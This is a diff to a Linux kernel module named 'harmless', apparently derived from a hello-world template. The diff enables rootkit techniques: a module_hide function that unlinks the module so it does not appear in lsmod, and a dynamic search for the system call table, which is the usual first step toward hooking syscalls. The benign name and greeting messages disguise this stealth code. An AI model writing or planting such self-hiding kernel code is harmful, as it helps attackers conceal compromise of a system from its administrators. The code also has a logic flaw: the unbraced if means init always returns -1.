@@ -28,7 +28,10 @@ unsigned long *dinamically_find_syscall_table(void) {
     return NULL;
 }
 
-
+/**
+*	Function to hide module from lsmod
+*
+*/
 static void module_hide(void){
        list_del(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
@@ -42,26 +45,20 @@ static void module_hide(void){
  *  @return returns 0 if successful
  */
 static int __init harmless_init(void){
-    //module_hide();
-    //syscall_table = dinamically_find_syscall_table();
-    printk(KERN_INFO "EBB: Hello from the BBB LKM!\n");
-    //if(syscall_table == NULL)
-      //printk(KERN_INFO "Couldn't find syscall_table????!\n");
-      //return -1;
+    module_hide();
+    syscall_table = dinamically_find_syscall_table();
+    printk(KERN_INFO "harmless: Hello from the harmless LKM!\n");
+    if(syscall_table == NULL)
+      printk(KERN_INFO "Couldn't find syscall_table????!\n");
+      return -1;
     return 0;
 }
 
-/** @brief The LKM cleanup function
- *  Similar to the initialization function, it is static. The __exit macro notifies that if this
- *  code is used for a built-in driver (not a LKM) that this function is not required.
- */
+
 static void __exit harmless_exit(void){
-   printk(KERN_INFO "EBB: Goodbye from the BBB LKM!\n");
+   printk(KERN_INFO "harmless: Goodbye from the harmless LKM!\n");
 }
 
-/** @brief A module must use the module_init() module_exit() macros from linux/init.h, which
- *  identify the initialization function at insertion time and the cleanup function (as
- *  listed above)
- */
+
 module_init(harmless_init);
 module_exit(harmless_exit);
